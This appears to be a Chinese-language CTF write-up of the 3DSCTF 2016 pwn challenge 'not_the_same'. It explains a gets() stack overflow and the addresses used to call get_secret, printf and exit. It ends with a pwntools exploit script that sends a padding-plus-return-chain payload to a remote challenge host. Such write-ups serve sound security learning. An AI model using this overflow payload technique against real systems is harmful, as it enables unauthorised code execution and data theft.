---
layout: mypost
title: 3DSCTF 2016 not_the_same
categories:
  - Pwn
extMath: false
---
_最新修改于  2026-11-24 16:34:40_

本题考点：
 - 栈溢出调用函数
 - 额外调用输出使得flag外显

在main中可以看到此处是通过gets(v4)注入栈内存
![](https://img.h1kari.cn/blog/images/af4471aea061e425661f7193f012570e079762ebce3aeb71df6e6d917f107ce7.webp)

查看main的栈帧可知，此处只需将v4对应的var_2D填满即可写__return_address
![](https://img.h1kari.cn/blog/images/c8fd50e30df79617dfad411a0ceab642496702b2686c9bcfa433684e15c1d230.webp)

接着在get_secret函数可以看到，此处是将flag.txt读取为fl4g变量，且此函数地址是0x080489A0
![](https://img.h1kari.cn/blog/images/c7a2afde6b6f0ec6767931ba057ff6ab77aa15a6ef0e6429dac6dae3b0d21104.webp)

可在.bss处看到fl4g的地址是0x080ECA2D
![](https://img.h1kari.cn/blog/images/6552b3269de52679b929a37e5be011491d75a157e2b5383a8c5c9c9064e8d298.webp)

接着调用0804F0A0的printf
![](https://img.h1kari.cn/blog/images/1fee7fbb0d9d7d3bb440fb7e05a8fe41d995ff74b683df7dfadeab98b60ca3fc.webp)

以及0804E660处的exit
![](https://img.h1kari.cn/blog/images/0fa8e04765858f09f33032763760c7e0bfdd3254c4ab3dd68a22cfa03513005b.webp)

即可得到flag
![](https://img.h1kari.cn/blog/images/28462ec389297e7e2a78920b1354bdd9363353c7f6c5eff1ad2740e1c5b9b61c.webp)
## EXP
```python
from pwn import *

context.arch = "i386"

io = remote("5c51701040f38db6ce3068b7.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="5c51701040f38db6ce3068b7.tcp-ctf2.dasctf.com")
payload = b"A"*45
payload += p32(0x08048A00) # ret
payload += p32(0x080489A0) # read flag
payload += p32(0x0804F0A0) # printf
payload += p32(0x0804E660) # exit
payload += p32(0x080ECA2D) # flag
io.sendline(payload)
io.interactive()

```